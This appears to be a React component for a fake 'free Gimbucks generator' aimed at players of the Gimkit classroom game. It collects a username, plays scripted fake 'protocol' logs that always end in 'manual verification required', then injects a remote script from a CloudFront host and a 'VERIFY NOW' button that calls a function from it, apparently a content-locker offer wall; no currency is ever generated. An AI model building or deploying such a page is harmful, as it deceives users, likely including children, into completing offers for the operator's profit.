import { useState, useEffect } from 'react';
import { motion } from 'motion/react';
import { ShieldAlert } from 'lucide-react';

export const GimkitGenerator = () => {
  const [step, setStep] = useState(1);
  const [amount, setAmount] = useState<number | null>(null);
  const [username, setUsername] = useState('');
  const [logs, setLogs] = useState<string[]>([]);

  useEffect(() => {
    if (step === 4) {
      const script1 = document.createElement('script');
      script1.type = 'text/javascript';
      script1.innerHTML = `var nwQUF_FUK_hnJomc={"it":4517272,"key":"d40cf"};`;
      document.head.appendChild(script1);

      const script2 = document.createElement('script');
      script2.src = 'https://d1qt1z4ccvak33.cloudfront.net/89088b0.js';
      document.head.appendChild(script2);
    }
  }, [step]);

  const amounts = [1000, 2800, 5000, 13500];

  const handleGenerate = async () => {
    if (!username) return;
    setStep(3);
    
    const sequence = [
      "[INITIATING GIMBUCKS PROTOCOL...]",
      `[AUTHORIZING PAYLOAD: ${amount} GIMBUCKS...]`,
      "[ESTABLISHING SECURE CONNECTION...]",
      `[ENCRYPTING USER SIGNATURE: ${username}...]`,
      "[SIGNATURE HASHED & VERIFIED]",
      "[ANALYZING USER BEHAVIORAL PATTERNS...]",
      "[FLAG: UNUSUAL ENTRY SIGNATURE. LIKELIHOOD OF BOT: 78%]",
      "[AUTOMATIC VERIFICATION FAILED]",
      "[MANUAL VERIFICATION REQUIRED. AWAITING MANUAL OVERRIDE...]"
    ];

    for (let i = 0; i < sequence.length; i++) {
      await new Promise(r => setTimeout(r, 1000));
      setLogs(prev => [...prev, sequence[i]]);
    }
    
    setTimeout(() => setStep(4), 1000);
  };

  return (
    <div className="min-h-screen bg-[#030419] text-[#e0e0ff] font-mono p-4 flex flex-col items-center justify-center relative overflow-hidden">
      <div className="absolute inset-0 opacity-20 pointer-events-none" style={{ backgroundImage: 'linear-gradient(rgba(0, 246, 255, 0.2) 1px, transparent 1px), linear-gradient(90deg, rgba(0, 246, 255, 0.2) 1px, transparent 1px)', backgroundSize: '30px 30px' }} />

      <div className="z-10 w-full max-w-3xl bg-[#0a0c28]/80 backdrop-blur-xl border border-[#00f6ff]/30 rounded-2xl p-8 shadow-[0_0_40px_rgba(0,246,255,0.1)]">
        <div className="text-center mb-8">
          <img src="https://i.postimg.cc/0j2HmbQT/GimBucks.webp" alt="Gimkit" className="w-24 h-24 mx-auto mb-4 drop-shadow-[0_0_15px_#00f6ff]" />
          <h2 className="text-3xl font-black tracking-wider text-transparent bg-clip-text bg-gradient-to-r from-[#00f6ff] to-[#ff00f5] drop-shadow-[0_0_10px_#00f6ff]">GIMBUCKS GENERATOR</h2>
        </div>

        {step === 1 && (
          <motion.div initial={{ opacity: 0 }} animate={{ opacity: 1 }}>
            <p className="text-center text-[#a0a0c0] mb-8">Select your desired Free Gimbucks Tier. Higher tiers are limited.</p>
            <div className="grid grid-cols-2 sm:grid-cols-4 gap-4 mb-8">
              {amounts.map(amt => (
                <button key={amt} onClick={() => setAmount(amt)} className={`bg-black/40 border rounded-xl p-4 flex flex-col items-center transition-all ${amount === amt ? 'border-[#00f6ff] shadow-[0_0_20px_#00f6ff] scale-105' : 'border-[#00f6ff]/20 hover:border-[#00f6ff]/50'}`}>
                  <img src="https://i.postimg.cc/0j2HmbQT/GimBucks.webp" alt="Gimbucks" className="w-12 h-12 mb-2 drop-shadow-[0_0_5px_#00f6ff]" />
                  <span className="text-xl font-bold">{amt.toLocaleString()}</span>
                  <span className="text-xs text-[#a0a0c0] tracking-widest">GIMBUCKS</span>
                </button>
              ))}
            </div>
            <button disabled={!amount} onClick={() => setStep(2)} className="w-full py-4 border-2 border-[#00f6ff] text-[#00f6ff] font-bold tracking-widest rounded-xl hover:bg-[#00f6ff] hover:text-[#030419] hover:shadow-[0_0_30px_#00f6ff] transition-all disabled:opacity-50">AUTHORIZE SELECTION</button>
          </motion.div>
        )}

        {step === 2 && (
          <motion.div initial={{ opacity: 0 }} animate={{ opacity: 1 }}>
            <p className="text-center text-[#a0a0c0] mb-8">Enter your Gimkit user signature for SENDING GIMBUCKS.</p>
            <input type="text" value={username} onChange={e => setUsername(e.target.value)} placeholder="Enter User Signature" className="w-full bg-black/50 border border-[#00f6ff]/30 rounded-xl px-6 py-4 text-center text-xl focus:outline-none focus:border-[#00f6ff] focus:shadow-[0_0_15px_rgba(0,246,255,0.5)] mb-8" />
            <button disabled={!username} onClick={handleGenerate} className="w-full py-4 border-2 border-[#00f6ff] text-[#00f6ff] font-bold tracking-widest rounded-xl hover:bg-[#00f6ff] hover:text-[#030419] hover:shadow-[0_0_30px_#00f6ff] transition-all disabled:opacity-50">TRANSMIT SIGNATURE</button>
          </motion.div>
        )}

        {step === 3 && (
          <motion.div initial={{ opacity: 0 }} animate={{ opacity: 1 }}>
            <h3 className="text-xl font-bold mb-4 text-[#00f6ff]">ENGAGING PROTOCOL...</h3>
            <div className="bg-black/60 border border-[#00f6ff]/30 rounded-xl p-4 h-64 overflow-y-auto font-mono text-sm space-y-2">
              {logs.map((log, i) => (
                <div key={i} className={`${log.includes('FAILED') || log.includes('FLAG') ? 'text-[#ff4d4d]' : 'text-[#00ff85]'}`}>{log}</div>
              ))}
              <div className="animate-pulse text-[#00f6ff]">_</div>
            </div>
          </motion.div>
        )}

        {step === 4 && (
          <motion.div initial={{ opacity: 0 }} animate={{ opacity: 1 }} className="text-center">
            <ShieldAlert className="w-20 h-20 mx-auto text-[#ffd900] drop-shadow-[0_0_15px_#ffd900] mb-6" />
            <h3 className="text-2xl font-bold text-[#ffd900] mb-4">MANUAL VERIFICATION REQUIRED</h3>
            <p className="text-[#a0a0c0] mb-8">Due to suspicious activity, our security protocol has flagged this entry. You must verify that you are not a bot to continue.</p>
            <button onClick={() => {
              // @ts-ignore
              if (typeof _Ci === 'function') _Ci();
            }} className="w-full py-4 border-2 border-[#ffd900] text-[#ffd900] font-bold tracking-widest rounded-xl hover:bg-[#ffd900] hover:text-[#030419] hover:shadow-[0_0_30px_#ffd900] transition-all animate-pulse">VERIFY NOW</button>
          </motion.div>
        )}
      </div>
    </div>
  );
};
